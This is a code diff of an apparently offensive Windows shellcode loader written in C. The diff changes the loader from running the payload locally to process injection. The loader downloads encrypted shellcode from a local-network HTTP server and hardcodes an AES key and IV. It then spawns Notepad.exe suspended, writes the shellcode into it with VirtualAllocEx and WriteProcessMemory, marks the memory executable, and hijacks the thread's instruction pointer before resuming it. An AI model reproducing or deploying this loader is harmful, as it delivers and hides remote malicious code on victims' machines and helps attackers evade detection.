@@ -7,12 +7,12 @@
 // import wininet.lib
 #pragma comment (lib, "Wininet.lib")
 #define PAYLOAD L"http://192.168.13.1:8000/encrypted_shellcode.bin"
-
+#define TARGET_PROCESS "Notepad.exe"
 // basic shellcode loader that have the shellcode embedded within the file
 
 // set to 1 for error logs
 
-// #define DEBUG
+//#define DEBUG
 
 
 // payload inside of encrypted_shellcode
@@ -129,18 +129,13 @@ BOOL GetPayload(LPCWSTR srcurl, PBYTE* sPayloadBytes, size_t* sPayloadSize) {
 
 
 
-
-
 unsigned char AesKey[] = {
-	0x38, 0x97, 0x97, 0x2D, 0xD8, 0x02, 0xAD, 0x25, 0x89, 0x66, 0x5E, 0xBA, 0x0F, 0x44, 0xB8, 0x17,
-	0xFB, 0xB7, 0xF5, 0xDA, 0x80, 0xFC, 0xF2, 0xBE, 0x81, 0x31, 0xE3, 0x77, 0xEE, 0x5D, 0x46, 0xDE };
+	0xFA, 0xD7, 0x41, 0xEE, 0x57, 0x3C, 0xDA, 0x0C, 0x85, 0x5B, 0xCC, 0x8F, 0x33, 0xEF, 0x70, 0xBC,
+	0x9F, 0x13, 0x0E, 0x0E, 0x67, 0xBC, 0x4D, 0xDB, 0x9D, 0x87, 0xEE, 0x35, 0x19, 0xB5, 0xBA, 0x0F };
 
 
 unsigned char AesIv[] = {
-	0xB5, 0x27, 0x51, 0x48, 0x31, 0x75, 0x5B, 0x88, 0x9A, 0x09, 0x7A, 0xD8, 0xDC, 0xE7, 0x31, 0x03 };
-
-
-
+	0x42, 0x88, 0x75, 0xDF, 0xC0, 0xB1, 0x54, 0x7C, 0x7C, 0x01, 0x16, 0x58, 0xC2, 0xE3, 0x94, 0xBA };
 // for debugging only
 
 VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {
@@ -176,11 +171,146 @@ BOOL DecryptAES(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherTextSize, IN PBYTE 
 	return TRUE;
 }
 
+BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread ) {
+    CHAR lpPath [MAX_PATH * 2];
+    CHAR WinDirectory [MAX_PATH];
+
+    // STARTUPINFO struct for CreateProcessA: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
+    STARTUPINFO Si = { 0 };
+
+    // PROCESS_INFORMATION struct for CreateProcessA: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
+    // typedef struct _PROCESS_INFORMATION {
+    //  HANDLE hProcess;
+    //  HANDLE hThread;
+    //  DWORD  dwProcessId;
+    //  DWORD  dwThreadId;
+    //} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
+
+    PROCESS_INFORMATION Pi = { 0 };
+
+
+    // Wipe the structs to be sure
+    RtlSecureZeroMemory( &Si , sizeof(STARTUPINFO));
+    RtlSecureZeroMemory(&Pi, sizeof(ProcessorInformation));
+
+    Si.cb = sizeof(STARTUPINFO);
+
+    // Get the name of the %WINDIR% variable to determine the exact location of a file
+
+    if (!GetEnvironmentVariableA("WINDIR", WinDirectory, MAX_PATH)) {
+        #ifdef DEBUG
+        printf("[!] GetEnviromentVariableA failed with error: %d \n", GetLastError());
+        #endif
+        return FALSE;
+    }
+    // Creating the full path for the executable
+    sprintf(lpPath, "%s\\System32\\%s", WinDirectory, lpProcessName);
+    #ifdef DEBUG
+    printf("[i] Running : \"%s\" ... ", lpPath);
+    #endif
+    if (!CreateProcessA(
+        NULL, // not needed
+        lpPath, // full path of the executable
+        NULL, // not needed
+        NULL, // not needed
+        FALSE, // set inherit to False
+        CREATE_SUSPENDED, // important: set process to start suspended
+        NULL, // not needed unless there's something about environment
+        NULL, // idk
+        &Si, // pointer to the STARTUPINFO struct
+        &Pi // Pointer to the PROCESSINFO struct
+    )) {
+
+        #ifdef DEBUG
+        printf("[!] CreateProcessA failed to create process %s at %s with error: %d\n ", lpProcessName, lpPath, GetLastError());
+        #endif
+        return FALSE;
+    }
+
+    #ifdef DEBUG
+    printf("[+] Done\n");
+    #endif
+
+    // return PID, Process and thread handle
+    *dwProcessId = Pi.dwProcessId;
+    *hProcess = Pi.hProcess;
+    *hThread  = Pi.hThread;
+
+    // Ensure that we got everything we need
+    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
+		return TRUE;
+
+    // else return false
+    return FALSE;
+}
+
+BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* pShellcodeAddress) {
+    SIZE_T lpNumberOfBytesWritten = 0;
+    DWORD dwOldProtection = 0;
+
+    *pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // allocate memory the size of the shellcode inside of the remote process
+
+    if (*pShellcodeAddress == NULL) {
+        #ifdef DEBUG
+        printf("[!] VirtualAllocEx failed with error : %d\n", GetLastError());
+        #endif
+        return FALSE;
+    }
+
+    #ifdef DEBUG
+    printf("\n[!] pShellcodeAddress allocated at 0x%p of Size %d\n", *pShellcodeAddress, sSizeOfShellcode);
+    #endif
+    if (!WriteProcessMemory(hProcess, *pShellcodeAddress, pShellcode, sSizeOfShellcode, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != sSizeOfShellcode) {
+        #ifdef DEBUG
+        printf("[!] WriteProcessMemory failed with error : %d\n", GetLastError());
+        #endif
+        return FALSE;
+    }
+
+    memset(pShellcode, '\0', sSizeOfShellcode);
+
+    if (!VirtualProtectEx(hProcess, *pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+        printf("[!] VirtualProtect failed with error : %d\n", GetLastError());
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+BOOL HijackThreadExecution(HANDLE hThread, IN PVOID pAddress) {
+    CONTEXT ThreadContext = {
+        .ContextFlags =  CONTEXT_CONTROL
+    };
+
+    // Get thread information
+    if (!GetThreadContext(hThread, &ThreadContext)) {
+        #ifdef DEBUG
+        printf("[!] GetThreadContext failed with error: %d\n", GetLastError());
+        #endif
+        return FALSE;
+    }
+    // Hijack target address
+    ThreadContext.Rip = pAddress;
+
+    // Write thread
+    if (!SetThreadContext(hThread, &ThreadContext)) {
+        #ifdef DEBUG
+        printf("[!] SetThreadContext failed with error: %d\n", GetLastError());
+        #endif
+        return FALSE;
+    }
+
+    return TRUE;
+}
 
 int main(int argc, char* argv[]) {
     PBYTE pEncrypted = NULL;
     size_t sSizeOfPayload = 0;
     DWORD flOldProtect = 0;
+    DWORD dwProcessId = 0;
+    HANDLE hProcess = NULL;
+    HANDLE hThread = NULL;
+    PVOID pShellcodeAddress = NULL;
 
     // 1: Get encrypted payload
 
@@ -205,35 +335,25 @@ int main(int argc, char* argv[]) {
     PrintHexData("pEncrypted", pEncrypted, sSizeOfPayload);
     #endif
 
-    PVOID pDecrypted = VirtualAlloc(NULL, sSizeOfPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-    if (pDecrypted == NULL) {
-        #ifdef DEBUG
-        printf("[!] VirtualAlloc failed with error: %d \n ", GetLastError());
-        #endif
-        return -1;
-    }
+    // 3: Create suspended process to inject payload to
+    if (!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) return -1;
+
+    // 4: Inject payload to suspended process
+    if (!InjectShellcodeToRemoteProcess(hProcess, pEncrypted, sSizeOfPayload, &pShellcodeAddress)) return -1;
+
+    // 5: Hijack thread execution to point to shellcode within the process
+
+    if (!HijackThreadExecution(hThread, pShellcodeAddress)) return -1;
+
+    // 6: Resume thread
+
+    ResumeThread(hThread);
+
+    #ifdef DEBUG
+    printf("[+] Executing payload with PID: %d\n", dwProcessId);
+    #endif
 
 
-    // 3: Copy payload to new location
-    memcpy(pDecrypted, pEncrypted, sSizeOfPayload); // copy the payload to the memory region we control
-    memset(pEncrypted, '\0', sSizeOfPayload); // empty the original payload location
-
-    if (!VirtualProtect(pDecrypted, sSizeOfPayload, PAGE_EXECUTE_READWRITE, &flOldProtect)) {
-        #ifdef DEBUG
-        printf("[!] VirtualProtect failed with error: %d \n ", GetLastError());
-        #endif
-        return -1;
-    }
-
-    // 4: Execute the payload
-    if (!CreateThread(NULL, NULL, pDecrypted, NULL, NULL, NULL)) {
-        #ifdef DEBUG
-        printf("[!] CreateThread failed with error: %d \n ", GetLastError());
-        #endif
-        return -1;
-    }
-
-    HeapFree(GetProcessHeap(), 0, pDecrypted);
     return 0;
 }
